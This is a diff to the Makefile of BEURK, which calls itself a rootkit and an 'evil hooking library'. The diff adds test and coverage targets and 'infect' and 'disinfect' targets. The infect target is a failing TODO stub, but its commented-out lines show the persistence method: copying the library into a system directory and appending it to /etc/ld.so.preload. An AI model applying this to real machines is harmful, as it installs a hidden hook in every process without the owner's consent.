@@ -5,6 +5,7 @@ SHELL				:= /bin/bash
 BEURK_CONFIG_FILE	?= beurk.conf
 BEURK_LIBRARY_NAME	?= $(shell sed -ne 's/^LIBRARY_NAME\s*=\s*//p' < $(BEURK_CONFIG_FILE))
 BEURK_DEBUG_LEVEL	?= $(shell sed -ne 's/^DEBUG_LEVEL\s*=\s*//p' < $(BEURK_CONFIG_FILE))
+BEURK_INSTALL_DIR	?= $(shell sed -ne 's/^INSTALL_DIR\s*=\s*//p' < $(BEURK_CONFIG_FILE))
 
 # compiler options
 CFLAGS		:= -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE
@@ -31,7 +32,7 @@ SOURCES		= src/init.c \
 OBJECTS		= $(patsubst src/%.c, obj/%.o, $(SOURCES))
 
 # make standard rule phony
-.PHONY: all re clean distclean debug test infect disinfect coverage config
+.PHONY: all re clean distclean test coverage infect disinfect
 
 # build separate objects
 obj/%.o: $(addprefix src/, %.c)
@@ -53,6 +54,24 @@ ifeq ($(BEURK_DEBUG_LEVEL), 0)
 	strip --strip-unneeded -R .note -R .comment $(BEURK_LIBRARY_NAME)
 endif
 
+# run all tests with `make test`
+test:
+	./utils/run-tests.sh ./tests
+
+# compile DSO with flags for code coverage
+coverage:
+	@echo TODO ! && false
+
+# infect current system with the rootkit
+infect: $(BEURK_LIBRARY_NAME)
+	@echo TODO ! && false
+	#! test -e $(BEURK_INSTALL_DIR)/$(BEURK_LIBRARY_NAME)
+	#cp $(BEURK_LIBRARY_NAME) $(BEURK_INSTALL_DIR)/
+	#echo $(BEURK_INSTALL_DIR)/$(BEURK_LIBRARY_NAME) >> /etc/ld.so.preload
+
+# uninstall the rootkit (if installed on current system)
+disinfect:
+	@echo TODO ! && false
 
 # re build evil hooking library
 re: distclean all
